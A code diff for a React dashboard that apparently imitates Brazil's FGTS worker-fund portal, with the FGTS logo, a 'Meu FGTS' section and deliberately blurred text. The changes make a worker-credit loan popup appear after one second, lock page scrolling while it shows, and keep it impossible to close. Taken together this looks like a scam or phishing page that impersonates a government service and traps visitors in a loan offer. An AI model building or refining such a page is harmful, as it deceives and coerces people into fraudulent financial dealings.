@@ -64,10 +64,10 @@ const Dashboard = () => {
         simulateApiCall();
       }
       
-      // Set timeout for popup to appear after 3 seconds
+      // Set timeout for popup to appear after 1 second
       const popupTimer = setTimeout(() => {
         setShowPopup(true);
-      }, 3000);
+      }, 1000); // Changed from 3000 to 1000
       
       return () => clearTimeout(popupTimer);
     } catch (error) {
@@ -75,6 +75,16 @@ const Dashboard = () => {
       setFullName("Usuário");
     }
   }, []);
+
+  // Add no-scroll class to body when popup is shown
+  useEffect(() => {
+    if (showPopup) {
+      document.body.classList.add('no-scroll');
+    }
+    return () => {
+      document.body.classList.remove('no-scroll');
+    };
+  }, [showPopup]);
 
   // Function to blur text (style it to look unreadable)
   const BlurredText = ({ children, className = "" }: { children: React.ReactNode, className?: string }) => (
@@ -88,7 +98,7 @@ const Dashboard = () => {
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
+    <div className="min-h-[100svh] flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9] overflow-hidden">
       {/* Header */}
       <div className="p-4 sm:p-6 flex justify-between items-center">
         <FGTSLogo className={`${isMobile ? 'h-6 w-24' : 'h-10'}`} />
@@ -104,7 +114,7 @@ const Dashboard = () => {
 
       {/* Main content */}
       <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
-        <div className="p-4 sm:p-6">
+        <div className="p-4 sm:p-6 pb-24"> {/* Added more padding at bottom to avoid scrolling */}
           {/* Meu FGTS */}
           <div className="mb-6">
             <h2 className="text-[#005CA9] text-2xl font-bold mb-2">Meu FGTS</h2>
@@ -214,7 +224,7 @@ const Dashboard = () => {
         </div>
       </div>
 
-      {/* Loan Popup - Modified to not be closable */}
+      {/* Loan Popup - Set to non-closable */}
       <Dialog open={showPopup} onOpenChange={() => {}}>
         <DialogContent className="max-w-[350px] rounded-lg px-4 py-4 bg-white">
           <DialogTitle className="sr-only">Crédito do Trabalhador</DialogTitle>
